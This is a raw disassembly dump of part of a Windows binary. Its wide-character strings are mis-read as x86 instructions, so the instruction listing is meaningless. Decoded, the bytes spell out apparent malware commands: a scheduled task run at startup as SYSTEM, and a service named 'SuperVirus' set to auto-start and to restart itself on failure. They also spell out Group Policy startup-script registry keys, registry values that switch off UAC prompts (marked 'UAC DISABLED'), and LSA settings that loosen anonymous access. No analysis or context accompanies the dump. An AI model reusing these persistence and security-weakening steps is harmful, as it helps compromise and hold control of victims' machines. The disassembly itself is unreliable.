  4073da:	74 00                	je     0x4073dc
  4073dc:	75 00                	jne    0x4073de
  4073de:	70 00                	jo     0x4073e0
  4073e0:	22 00                	and    (%eax),%al
  4073e2:	20 00                	and    %al,(%eax)
  4073e4:	2f                   	das
  4073e5:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4073e9:	00 20                	add    %ah,(%eax)
  4073eb:	00 22                	add    %ah,(%edx)
  4073ed:	00 00                	add    %al,(%eax)
  4073ef:	37                   	aaa
  4073f0:	22 00                	and    (%eax),%al
  4073f2:	20 00                	and    %al,(%eax)
  4073f4:	2f                   	das
  4073f5:	00 73 00             	add    %dh,0x0(%ebx)
  4073f8:	63 00                	arpl   %eax,(%eax)
  4073fa:	20 00                	and    %al,(%eax)
  4073fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4073fd:	00 6e 00             	add    %ch,0x0(%esi)
  407400:	73 00                	jae    0x407402
  407402:	74 00                	je     0x407404
  407404:	61                   	popa
  407405:	00 72 00             	add    %dh,0x0(%edx)
  407408:	74 00                	je     0x40740a
  40740a:	20 00                	and    %al,(%eax)
  40740c:	2f                   	das
  40740d:	00 72 00             	add    %dh,0x0(%edx)
  407410:	75 00                	jne    0x407412
  407412:	20 00                	and    %al,(%eax)
  407414:	53                   	push   %ebx
  407415:	00 59 00             	add    %bl,0x0(%ecx)
  407418:	53                   	push   %ebx
  407419:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40741d:	00 4d 00             	add    %cl,0x0(%ebp)
  407420:	20 00                	and    %al,(%eax)
  407422:	2f                   	das
  407423:	00 66 00             	add    %ah,0x0(%esi)
  407426:	00 43 73             	add    %al,0x73(%ebx)
  407429:	00 63 00             	add    %ah,0x0(%ebx)
  40742c:	20 00                	and    %al,(%eax)
  40742e:	63 00                	arpl   %eax,(%eax)
  407430:	72 00                	jb     0x407432
  407432:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407436:	74 00                	je     0x407438
  407438:	65 00 20             	add    %ah,%gs:(%eax)
  40743b:	00 22                	add    %ah,(%edx)
  40743d:	00 53 00             	add    %dl,0x0(%ebx)
  407440:	75 00                	jne    0x407442
  407442:	70 00                	jo     0x407444
  407444:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407448:	56                   	push   %esi
  407449:	00 69 00             	add    %ch,0x0(%ecx)
  40744c:	72 00                	jb     0x40744e
  40744e:	75 00                	jne    0x407450
  407450:	73 00                	jae    0x407452
  407452:	22 00                	and    (%eax),%al
  407454:	20 00                	and    %al,(%eax)
  407456:	62 00                	bound  %eax,(%eax)
  407458:	69 00 6e 00 50 00    	imul   $0x50006e,(%eax),%eax
  40745e:	61                   	popa
  40745f:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  407463:	00 3d 00 20 00 22    	add    %bh,0x22002000
  407469:	00 00                	add    %al,(%eax)
  40746b:	1b 22                	sbb    (%edx),%esp
  40746d:	00 20                	add    %ah,(%eax)
  40746f:	00 73 00             	add    %dh,0x0(%ebx)
  407472:	74 00                	je     0x407474
  407474:	61                   	popa
  407475:	00 72 00             	add    %dh,0x0(%edx)
  407478:	74 00                	je     0x40747a
  40747a:	3d 00 20 00 61       	cmp    $0x61002000,%eax
  40747f:	00 75 00             	add    %dh,0x0(%ebp)
  407482:	74 00                	je     0x407484
  407484:	6f                   	outsl  %ds:(%esi),(%dx)
  407485:	00 00                	add    %al,(%eax)
  407487:	45                   	inc    %ebp
  407488:	73 00                	jae    0x40748a
  40748a:	63 00                	arpl   %eax,(%eax)
  40748c:	20 00                	and    %al,(%eax)
  40748e:	63 00                	arpl   %eax,(%eax)
  407490:	6f                   	outsl  %ds:(%esi),(%dx)
  407491:	00 6e 00             	add    %ch,0x0(%esi)
  407494:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  407498:	67 00 20             	add    %ah,(%bx,%si)
  40749b:	00 22                	add    %ah,(%edx)
  40749d:	00 53 00             	add    %dl,0x0(%ebx)
  4074a0:	75 00                	jne    0x4074a2
  4074a2:	70 00                	jo     0x4074a4
  4074a4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074a8:	56                   	push   %esi
  4074a9:	00 69 00             	add    %ch,0x0(%ecx)
  4074ac:	72 00                	jb     0x4074ae
  4074ae:	75 00                	jne    0x4074b0
  4074b0:	73 00                	jae    0x4074b2
  4074b2:	22 00                	and    (%eax),%al
  4074b4:	20 00                	and    %al,(%eax)
  4074b6:	73 00                	jae    0x4074b8
  4074b8:	74 00                	je     0x4074ba
  4074ba:	61                   	popa
  4074bb:	00 72 00             	add    %dh,0x0(%edx)
  4074be:	74 00                	je     0x4074c0
  4074c0:	3d 00 20 00 61       	cmp    $0x61002000,%eax
  4074c5:	00 75 00             	add    %dh,0x0(%ebp)
  4074c8:	74 00                	je     0x4074ca
  4074ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4074cb:	00 00                	add    %al,(%eax)
  4074cd:	80 a1 73 00 63 00 20 	andb   $0x20,0x630073(%ecx)
  4074d4:	00 66 00             	add    %ah,0x0(%esi)
  4074d7:	61                   	popa
  4074d8:	00 69 00             	add    %ch,0x0(%ecx)
  4074db:	6c                   	insb   (%dx),%es:(%edi)
  4074dc:	00 75 00             	add    %dh,0x0(%ebp)
  4074df:	72 00                	jb     0x4074e1
  4074e1:	65 00 20             	add    %ah,%gs:(%eax)
  4074e4:	00 22                	add    %ah,(%edx)
  4074e6:	00 53 00             	add    %dl,0x0(%ebx)
  4074e9:	75 00                	jne    0x4074eb
  4074eb:	70 00                	jo     0x4074ed
  4074ed:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074f1:	56                   	push   %esi
  4074f2:	00 69 00             	add    %ch,0x0(%ecx)
  4074f5:	72 00                	jb     0x4074f7
  4074f7:	75 00                	jne    0x4074f9
  4074f9:	73 00                	jae    0x4074fb
  4074fb:	22 00                	and    (%eax),%al
  4074fd:	20 00                	and    %al,(%eax)
  4074ff:	72 00                	jb     0x407501
  407501:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407505:	65 00 74 00 3d       	add    %dh,%gs:0x3d(%eax,%eax,1)
  40750a:	00 20                	add    %ah,(%eax)
  40750c:	00 30                	add    %dh,(%eax)
  40750e:	00 20                	add    %ah,(%eax)
  407510:	00 61 00             	add    %ah,0x0(%ecx)
  407513:	63 00                	arpl   %eax,(%eax)
  407515:	74 00                	je     0x407517
  407517:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40751d:	73 00                	jae    0x40751f
  40751f:	3d 00 20 00 72       	cmp    $0x72002000,%eax
  407524:	00 65 00             	add    %ah,0x0(%ebp)
  407527:	73 00                	jae    0x407529
  407529:	74 00                	je     0x40752b
  40752b:	61                   	popa
  40752c:	00 72 00             	add    %dh,0x0(%edx)
  40752f:	74 00                	je     0x407531
  407531:	2f                   	das
  407532:	00 35 00 30 00 30    	add    %dh,0x30003000
  407538:	00 30                	add    %dh,(%eax)
  40753a:	00 2f                	add    %ch,(%edi)
  40753c:	00 72 00             	add    %dh,0x0(%edx)
  40753f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407543:	74 00                	je     0x407545
  407545:	61                   	popa
  407546:	00 72 00             	add    %dh,0x0(%edx)
  407549:	74 00                	je     0x40754b
  40754b:	2f                   	das
  40754c:	00 35 00 30 00 30    	add    %dh,0x30003000
  407552:	00 30                	add    %dh,(%eax)
  407554:	00 2f                	add    %ch,(%edi)
  407556:	00 72 00             	add    %dh,0x0(%edx)
  407559:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40755d:	74 00                	je     0x40755f
  40755f:	61                   	popa
  407560:	00 72 00             	add    %dh,0x0(%edx)
  407563:	74 00                	je     0x407565
  407565:	2f                   	das
  407566:	00 35 00 30 00 30    	add    %dh,0x30003000
  40756c:	00 30                	add    %dh,(%eax)
  40756e:	00 00                	add    %al,(%eax)
  407570:	0f 77                	emms
  407572:	00 6d 00             	add    %ch,0x0(%ebp)
  407575:	69 00 2e 00 70 00    	imul   $0x70002e,(%eax),%eax
  40757b:	73 00                	jae    0x40757d
  40757d:	31 00                	xor    %eax,(%eax)
  40757f:	00 75 53             	add    %dh,0x53(%ebp)
  407582:	00 4f 00             	add    %cl,0x0(%edi)
  407585:	46                   	inc    %esi
  407586:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40758a:	00 41 00             	add    %al,0x0(%ecx)
  40758d:	52                   	push   %edx
  40758e:	00 45 00             	add    %al,0x0(%ebp)
  407591:	5c                   	pop    %esp
  407592:	00 50 00             	add    %dl,0x0(%eax)
  407595:	6f                   	outsl  %ds:(%esi),(%dx)
  407596:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40759a:	00 63 00             	add    %ah,0x0(%ebx)
  40759d:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4075a3:	5c                   	pop    %esp
  4075a4:	00 4d 00             	add    %cl,0x0(%ebp)
  4075a7:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4075ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ae:	00 73 00             	add    %dh,0x0(%ebx)
  4075b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075b2:	00 66 00             	add    %ah,0x0(%esi)
  4075b5:	74 00                	je     0x4075b7
  4075b7:	5c                   	pop    %esp
  4075b8:	00 57 00             	add    %dl,0x0(%edi)
  4075bb:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4075c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c2:	00 77 00             	add    %dh,0x0(%edi)
  4075c5:	73 00                	jae    0x4075c7
  4075c7:	5c                   	pop    %esp
  4075c8:	00 53 00             	add    %dl,0x0(%ebx)
  4075cb:	79 00                	jns    0x4075cd
  4075cd:	73 00                	jae    0x4075cf
  4075cf:	74 00                	je     0x4075d1
  4075d1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4075d5:	5c                   	pop    %esp
  4075d6:	00 53 00             	add    %dl,0x0(%ebx)
  4075d9:	63 00                	arpl   %eax,(%eax)
  4075db:	72 00                	jb     0x4075dd
  4075dd:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4075e3:	73 00                	jae    0x4075e5
  4075e5:	5c                   	pop    %esp
  4075e6:	00 53 00             	add    %dl,0x0(%ebx)
  4075e9:	74 00                	je     0x4075eb
  4075eb:	61                   	popa
  4075ec:	00 72 00             	add    %dh,0x0(%edx)
  4075ef:	74 00                	je     0x4075f1
  4075f1:	75 00                	jne    0x4075f3
  4075f3:	70 00                	jo     0x4075f5
  4075f5:	00 79 53             	add    %bh,0x53(%ecx)
  4075f8:	00 4f 00             	add    %cl,0x0(%edi)
  4075fb:	46                   	inc    %esi
  4075fc:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  407600:	00 41 00             	add    %al,0x0(%ecx)
  407603:	52                   	push   %edx
  407604:	00 45 00             	add    %al,0x0(%ebp)
  407607:	5c                   	pop    %esp
  407608:	00 50 00             	add    %dl,0x0(%eax)
  40760b:	6f                   	outsl  %ds:(%esi),(%dx)
  40760c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  407610:	00 63 00             	add    %ah,0x0(%ebx)
  407613:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407619:	5c                   	pop    %esp
  40761a:	00 4d 00             	add    %cl,0x0(%ebp)
  40761d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407623:	6f                   	outsl  %ds:(%esi),(%dx)
  407624:	00 73 00             	add    %dh,0x0(%ebx)
  407627:	6f                   	outsl  %ds:(%esi),(%dx)
  407628:	00 66 00             	add    %ah,0x0(%esi)
  40762b:	74 00                	je     0x40762d
  40762d:	5c                   	pop    %esp
  40762e:	00 57 00             	add    %dl,0x0(%edi)
  407631:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407637:	6f                   	outsl  %ds:(%esi),(%dx)
  407638:	00 77 00             	add    %dh,0x0(%edi)
  40763b:	73 00                	jae    0x40763d
  40763d:	5c                   	pop    %esp
  40763e:	00 53 00             	add    %dl,0x0(%ebx)
  407641:	79 00                	jns    0x407643
  407643:	73 00                	jae    0x407645
  407645:	74 00                	je     0x407647
  407647:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40764b:	5c                   	pop    %esp
  40764c:	00 53 00             	add    %dl,0x0(%ebx)
  40764f:	63 00                	arpl   %eax,(%eax)
  407651:	72 00                	jb     0x407653
  407653:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407659:	73 00                	jae    0x40765b
  40765b:	5c                   	pop    %esp
  40765c:	00 53 00             	add    %dl,0x0(%ebx)
  40765f:	74 00                	je     0x407661
  407661:	61                   	popa
  407662:	00 72 00             	add    %dh,0x0(%edx)
  407665:	74 00                	je     0x407667
  407667:	75 00                	jne    0x407669
  407669:	70 00                	jo     0x40766b
  40766b:	5c                   	pop    %esp
  40766c:	00 30                	add    %dh,(%eax)
  40766e:	00 00                	add    %al,(%eax)
  407670:	0d 53 00 63 00       	or     $0x630053,%eax
  407675:	72 00                	jb     0x407677
  407677:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40767d:	00 15 50 00 61 00    	add    %dl,0x610050
  407683:	72 00                	jb     0x407685
  407685:	61                   	popa
  407686:	00 6d 00             	add    %ch,0x0(%ebp)
  407689:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  40768e:	00 72 00             	add    %dh,0x0(%edx)
  407691:	73 00                	jae    0x407693
  407693:	00 80 a9 53 00 4f    	add    %al,0x4f0053a9(%eax)
  407699:	00 46 00             	add    %al,0x0(%esi)
  40769c:	54                   	push   %esp
  40769d:	00 57 00             	add    %dl,0x0(%edi)
  4076a0:	41                   	inc    %ecx
  4076a1:	00 52 00             	add    %dl,0x0(%edx)
  4076a4:	45                   	inc    %ebp
  4076a5:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  4076a9:	00 69 00             	add    %ch,0x0(%ecx)
  4076ac:	63 00                	arpl   %eax,(%eax)
  4076ae:	72 00                	jb     0x4076b0
  4076b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b1:	00 73 00             	add    %dh,0x0(%ebx)
  4076b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4076b5:	00 66 00             	add    %ah,0x0(%esi)
  4076b8:	74 00                	je     0x4076ba
  4076ba:	5c                   	pop    %esp
  4076bb:	00 57 00             	add    %dl,0x0(%edi)
  4076be:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4076c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4076c5:	00 77 00             	add    %dh,0x0(%edi)
  4076c8:	73 00                	jae    0x4076ca
  4076ca:	5c                   	pop    %esp
  4076cb:	00 43 00             	add    %al,0x0(%ebx)
  4076ce:	75 00                	jne    0x4076d0
  4076d0:	72 00                	jb     0x4076d2
  4076d2:	72 00                	jb     0x4076d4
  4076d4:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4076d8:	74 00                	je     0x4076da
  4076da:	56                   	push   %esi
  4076db:	00 65 00             	add    %ah,0x0(%ebp)
  4076de:	72 00                	jb     0x4076e0
  4076e0:	73 00                	jae    0x4076e2
  4076e2:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4076e8:	5c                   	pop    %esp
  4076e9:	00 47 00             	add    %al,0x0(%edi)
  4076ec:	72 00                	jb     0x4076ee
  4076ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ef:	00 75 00             	add    %dh,0x0(%ebp)
  4076f2:	70 00                	jo     0x4076f4
  4076f4:	20 00                	and    %al,(%eax)
  4076f6:	50                   	push   %eax
  4076f7:	00 6f 00             	add    %ch,0x0(%edi)
  4076fa:	6c                   	insb   (%dx),%es:(%edi)
  4076fb:	00 69 00             	add    %ch,0x0(%ecx)
  4076fe:	63 00                	arpl   %eax,(%eax)
  407700:	79 00                	jns    0x407702
  407702:	5c                   	pop    %esp
  407703:	00 53 00             	add    %dl,0x0(%ebx)
  407706:	74 00                	je     0x407708
  407708:	61                   	popa
  407709:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40770d:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  407711:	00 61 00             	add    %ah,0x0(%ecx)
  407714:	63 00                	arpl   %eax,(%eax)
  407716:	68 00 69 00 6e       	push   $0x6e006900
  40771b:	00 65 00             	add    %ah,0x0(%ebp)
  40771e:	5c                   	pop    %esp
  40771f:	00 53 00             	add    %dl,0x0(%ebx)
  407722:	63 00                	arpl   %eax,(%eax)
  407724:	72 00                	jb     0x407726
  407726:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40772c:	73 00                	jae    0x40772e
  40772e:	5c                   	pop    %esp
  40772f:	00 53 00             	add    %dl,0x0(%ebx)
  407732:	74 00                	je     0x407734
  407734:	61                   	popa
  407735:	00 72 00             	add    %dh,0x0(%edx)
  407738:	74 00                	je     0x40773a
  40773a:	75 00                	jne    0x40773c
  40773c:	70 00                	jo     0x40773e
  40773e:	00 80 ad 53 00 4f    	add    %al,0x4f0053ad(%eax)
  407744:	00 46 00             	add    %al,0x0(%esi)
  407747:	54                   	push   %esp
  407748:	00 57 00             	add    %dl,0x0(%edi)
  40774b:	41                   	inc    %ecx
  40774c:	00 52 00             	add    %dl,0x0(%edx)
  40774f:	45                   	inc    %ebp
  407750:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  407754:	00 69 00             	add    %ch,0x0(%ecx)
  407757:	63 00                	arpl   %eax,(%eax)
  407759:	72 00                	jb     0x40775b
  40775b:	6f                   	outsl  %ds:(%esi),(%dx)
  40775c:	00 73 00             	add    %dh,0x0(%ebx)
  40775f:	6f                   	outsl  %ds:(%esi),(%dx)
  407760:	00 66 00             	add    %ah,0x0(%esi)
  407763:	74 00                	je     0x407765
  407765:	5c                   	pop    %esp
  407766:	00 57 00             	add    %dl,0x0(%edi)
  407769:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40776f:	6f                   	outsl  %ds:(%esi),(%dx)
  407770:	00 77 00             	add    %dh,0x0(%edi)
  407773:	73 00                	jae    0x407775
  407775:	5c                   	pop    %esp
  407776:	00 43 00             	add    %al,0x0(%ebx)
  407779:	75 00                	jne    0x40777b
  40777b:	72 00                	jb     0x40777d
  40777d:	72 00                	jb     0x40777f
  40777f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407783:	74 00                	je     0x407785
  407785:	56                   	push   %esi
  407786:	00 65 00             	add    %ah,0x0(%ebp)
  407789:	72 00                	jb     0x40778b
  40778b:	73 00                	jae    0x40778d
  40778d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407793:	5c                   	pop    %esp
  407794:	00 47 00             	add    %al,0x0(%edi)
  407797:	72 00                	jb     0x407799
  407799:	6f                   	outsl  %ds:(%esi),(%dx)
  40779a:	00 75 00             	add    %dh,0x0(%ebp)
  40779d:	70 00                	jo     0x40779f
  40779f:	20 00                	and    %al,(%eax)
  4077a1:	50                   	push   %eax
  4077a2:	00 6f 00             	add    %ch,0x0(%edi)
  4077a5:	6c                   	insb   (%dx),%es:(%edi)
  4077a6:	00 69 00             	add    %ch,0x0(%ecx)
  4077a9:	63 00                	arpl   %eax,(%eax)
  4077ab:	79 00                	jns    0x4077ad
  4077ad:	5c                   	pop    %esp
  4077ae:	00 53 00             	add    %dl,0x0(%ebx)
  4077b1:	74 00                	je     0x4077b3
  4077b3:	61                   	popa
  4077b4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4077b8:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  4077bc:	00 61 00             	add    %ah,0x0(%ecx)
  4077bf:	63 00                	arpl   %eax,(%eax)
  4077c1:	68 00 69 00 6e       	push   $0x6e006900
  4077c6:	00 65 00             	add    %ah,0x0(%ebp)
  4077c9:	5c                   	pop    %esp
  4077ca:	00 53 00             	add    %dl,0x0(%ebx)
  4077cd:	63 00                	arpl   %eax,(%eax)
  4077cf:	72 00                	jb     0x4077d1
  4077d1:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4077d7:	73 00                	jae    0x4077d9
  4077d9:	5c                   	pop    %esp
  4077da:	00 53 00             	add    %dl,0x0(%ebx)
  4077dd:	74 00                	je     0x4077df
  4077df:	61                   	popa
  4077e0:	00 72 00             	add    %dh,0x0(%edx)
  4077e3:	74 00                	je     0x4077e5
  4077e5:	75 00                	jne    0x4077e7
  4077e7:	70 00                	jo     0x4077e9
  4077e9:	5c                   	pop    %esp
  4077ea:	00 30                	add    %dh,(%eax)
  4077ec:	00 00                	add    %al,(%eax)
  4077ee:	73 53                	jae    0x407843
  4077f0:	00 4f 00             	add    %cl,0x0(%edi)
  4077f3:	46                   	inc    %esi
  4077f4:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4077f8:	00 41 00             	add    %al,0x0(%ecx)
  4077fb:	52                   	push   %edx
  4077fc:	00 45 00             	add    %al,0x0(%ebp)
  4077ff:	5c                   	pop    %esp
  407800:	00 4d 00             	add    %cl,0x0(%ebp)
  407803:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407809:	6f                   	outsl  %ds:(%esi),(%dx)
  40780a:	00 73 00             	add    %dh,0x0(%ebx)
  40780d:	6f                   	outsl  %ds:(%esi),(%dx)
  40780e:	00 66 00             	add    %ah,0x0(%esi)
  407811:	74 00                	je     0x407813
  407813:	5c                   	pop    %esp
  407814:	00 57 00             	add    %dl,0x0(%edi)
  407817:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40781d:	6f                   	outsl  %ds:(%esi),(%dx)
  40781e:	00 77 00             	add    %dh,0x0(%edi)
  407821:	73 00                	jae    0x407823
  407823:	5c                   	pop    %esp
  407824:	00 43 00             	add    %al,0x0(%ebx)
  407827:	75 00                	jne    0x407829
  407829:	72 00                	jb     0x40782b
  40782b:	72 00                	jb     0x40782d
  40782d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407831:	74 00                	je     0x407833
  407833:	56                   	push   %esi
  407834:	00 65 00             	add    %ah,0x0(%ebp)
  407837:	72 00                	jb     0x407839
  407839:	73 00                	jae    0x40783b
  40783b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407841:	5c                   	pop    %esp
  407842:	00 50 00             	add    %dl,0x0(%eax)
  407845:	6f                   	outsl  %ds:(%esi),(%dx)
  407846:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40784a:	00 63 00             	add    %ah,0x0(%ebx)
  40784d:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407853:	5c                   	pop    %esp
  407854:	00 53 00             	add    %dl,0x0(%ebx)
  407857:	79 00                	jns    0x407859
  407859:	73 00                	jae    0x40785b
  40785b:	74 00                	je     0x40785d
  40785d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407861:	00 13                	add    %dl,(%ebx)
  407863:	45                   	inc    %ebp
  407864:	00 6e 00             	add    %ch,0x0(%esi)
  407867:	61                   	popa
  407868:	00 62 00             	add    %ah,0x0(%edx)
  40786b:	6c                   	insb   (%dx),%es:(%edi)
  40786c:	00 65 00             	add    %ah,0x0(%ebp)
  40786f:	4c                   	dec    %esp
  407870:	00 55 00             	add    %dl,0x0(%ebp)
  407873:	41                   	inc    %ecx
  407874:	00 00                	add    %al,(%eax)
  407876:	35 43 00 6f 00       	xor    $0x6f0043,%eax
  40787b:	6e                   	outsb  %ds:(%esi),(%dx)
  40787c:	00 73 00             	add    %dh,0x0(%ebx)
  40787f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407883:	74 00                	je     0x407885
  407885:	50                   	push   %eax
  407886:	00 72 00             	add    %dh,0x0(%edx)
  407889:	6f                   	outsl  %ds:(%esi),(%dx)
  40788a:	00 6d 00             	add    %ch,0x0(%ebp)
  40788d:	70 00                	jo     0x40788f
  40788f:	74 00                	je     0x407891
  407891:	42                   	inc    %edx
  407892:	00 65 00             	add    %ah,0x0(%ebp)
  407895:	68 00 61 00 76       	push   $0x76006100
  40789a:	00 69 00             	add    %ch,0x0(%ecx)
  40789d:	6f                   	outsl  %ds:(%esi),(%dx)
  40789e:	00 72 00             	add    %dh,0x0(%edx)
  4078a1:	41                   	inc    %ecx
  4078a2:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  4078a6:	00 69 00             	add    %ch,0x0(%ecx)
  4078a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078aa:	00 00                	add    %al,(%eax)
  4078ac:	2b 50 00             	sub    0x0(%eax),%edx
  4078af:	72 00                	jb     0x4078b1
  4078b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b2:	00 6d 00             	add    %ch,0x0(%ebp)
  4078b5:	70 00                	jo     0x4078b7
  4078b7:	74 00                	je     0x4078b9
  4078b9:	4f                   	dec    %edi
  4078ba:	00 6e 00             	add    %ch,0x0(%esi)
  4078bd:	53                   	push   %ebx
  4078be:	00 65 00             	add    %ah,0x0(%ebp)
  4078c1:	63 00                	arpl   %eax,(%eax)
  4078c3:	75 00                	jne    0x4078c5
  4078c5:	72 00                	jb     0x4078c7
  4078c7:	65 00 44 00 65       	add    %al,%gs:0x65(%eax,%eax,1)
  4078cc:	00 73 00             	add    %dh,0x0(%ebx)
  4078cf:	6b 00 74             	imul   $0x74,(%eax),%eax
  4078d2:	00 6f 00             	add    %ch,0x0(%edi)
  4078d5:	70 00                	jo     0x4078d7
  4078d7:	00 1f                	add    %bl,(%edi)
  4078d9:	3d d8 13 dd 20       	cmp    $0x20dd13d8,%eax
  4078de:	00 55 00             	add    %dl,0x0(%ebp)
  4078e1:	41                   	inc    %ecx
  4078e2:	00 43 00             	add    %al,0x0(%ebx)
  4078e5:	20 00                	and    %al,(%eax)
  4078e7:	44                   	inc    %esp
  4078e8:	00 49 00             	add    %cl,0x0(%ecx)
  4078eb:	53                   	push   %ebx
  4078ec:	00 41 00             	add    %al,0x0(%ecx)
  4078ef:	42                   	inc    %edx
  4078f0:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4078f4:	00 44 00 01          	add    %al,0x1(%eax,%eax,1)
  4078f8:	49                   	dec    %ecx
  4078f9:	53                   	push   %ebx
  4078fa:	00 59 00             	add    %bl,0x0(%ecx)
  4078fd:	53                   	push   %ebx
  4078fe:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  407902:	00 4d 00             	add    %cl,0x0(%ebp)
  407905:	5c                   	pop    %esp
  407906:	00 43 00             	add    %al,0x0(%ebx)
  407909:	75 00                	jne    0x40790b
  40790b:	72 00                	jb     0x40790d
  40790d:	72 00                	jb     0x40790f
  40790f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407913:	74 00                	je     0x407915
  407915:	43                   	inc    %ebx
  407916:	00 6f 00             	add    %ch,0x0(%edi)
  407919:	6e                   	outsb  %ds:(%esi),(%dx)
  40791a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40791e:	00 6f 00             	add    %ch,0x0(%edi)
  407921:	6c                   	insb   (%dx),%es:(%edi)
  407922:	00 53 00             	add    %dl,0x0(%ebx)
  407925:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  40792a:	00 43 00             	add    %al,0x0(%ebx)
  40792d:	6f                   	outsl  %ds:(%esi),(%dx)
  40792e:	00 6e 00             	add    %ch,0x0(%esi)
  407931:	74 00                	je     0x407933
  407933:	72 00                	jb     0x407935
  407935:	6f                   	outsl  %ds:(%esi),(%dx)
  407936:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  40793a:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40793e:	00 61 00             	add    %ah,0x0(%ecx)
  407941:	00 33                	add    %dh,(%ebx)
  407943:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407947:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40794b:	79 00                	jns    0x40794d
  40794d:	6f                   	outsl  %ds:(%esi),(%dx)
  40794e:	00 6e 00             	add    %ch,0x0(%esi)
  407951:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  407955:	6e                   	outsb  %ds:(%esi),(%dx)
  407956:	00 63 00             	add    %ah,0x0(%ebx)
  407959:	6c                   	insb   (%dx),%es:(%edi)
  40795a:	00 75 00             	add    %dh,0x0(%ebp)
  40795d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407961:	73 00                	jae    0x407963
  407963:	61                   	popa
  407964:	00 6e 00             	add    %ch,0x0(%esi)
  407967:	6f                   	outsl  %ds:(%esi),(%dx)
  407968:	00 6e 00             	add    %ch,0x0(%esi)
  40796b:	79 00                	jns    0x40796d
  40796d:	6d                   	insl   (%dx),%es:(%edi)
  40796e:	00 6f 00             	add    %ch,0x0(%edi)
  407971:	75 00                	jne    0x407973
  407973:	73 00                	jae    0x407975
  407975:	00 23                	add    %ah,(%ebx)
  407977:	72 00                	jb     0x407979
  407979:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40797d:	74 00                	je     0x40797f
  40797f:	72 00                	jb     0x407981
  407981:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  407987:	61                   	popa
  407988:	00 6e 00             	add    %ch,0x0(%esi)
  40798b:	6f                   	outsl  %ds:(%esi),(%dx)
  40798c:	00 6e 00             	add    %ch,0x0(%esi)
  40798f:	79 00                	jns    0x407991
  407991:	6d                   	insl   (%dx),%es:(%edi)
  407992:	00 6f 00             	add    %ch,0x0(%edi)
  407995:	75 00                	jne    0x407997
